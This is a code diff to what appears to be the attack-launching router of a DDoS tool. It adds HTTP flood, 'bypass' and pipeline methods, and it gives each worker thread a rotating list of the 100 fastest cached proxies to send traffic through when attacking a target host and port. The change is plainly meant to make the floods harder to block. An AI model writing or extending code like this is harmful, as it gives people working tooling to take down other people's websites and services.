@@ -23,6 +23,7 @@ import {
   DeleteAttackParams,
   StopAttackParams,
 } from "@workspace/api-zod";
+import { proxyCache } from "./proxies.js";
 
 const router: IRouter = Router();
 
@@ -94,12 +95,18 @@ async function runL3Simulation(
 // ─────────────────────────────────────────────────────────────────────────
 //  SPAWN POOL — spawns numWorkers workers for a single method
 // ─────────────────────────────────────────────────────────────────────────
+const HTTP_PROXY_METHODS = new Set(["http-flood", "http-bypass", "http-pipeline"]);
+
 function spawnPool(
   method: string, target: string, port: number, threads: number,
   numWorkers: number, signal: AbortSignal, onStats: (p: number, b: number) => void,
 ): Promise<void> {
   const threadsPerWorker = Math.max(1, Math.floor(threads / numWorkers));
   const workers: Worker[] = [];
+  // Pass top 100 fastest proxies to HTTP workers for rotation
+  const proxies = HTTP_PROXY_METHODS.has(method) && proxyCache.length > 0
+    ? proxyCache.slice(0, 100).map(p => ({ host: p.host, port: p.port }))
+    : [];
 
   return new Promise<void>((resolve) => {
     const finished = new Set<number>();
@@ -111,7 +118,7 @@ function spawnPool(
         ? threads - threadsPerWorker * (numWorkers - 1)
         : threadsPerWorker;
 
-      const w = new Worker(WORKER_FILE, { workerData: { method, target, port, threads: t } });
+      const w = new Worker(WORKER_FILE, { workerData: { method, target, port, threads: t, proxies } });
       const idx = i;
       workers.push(w);
 
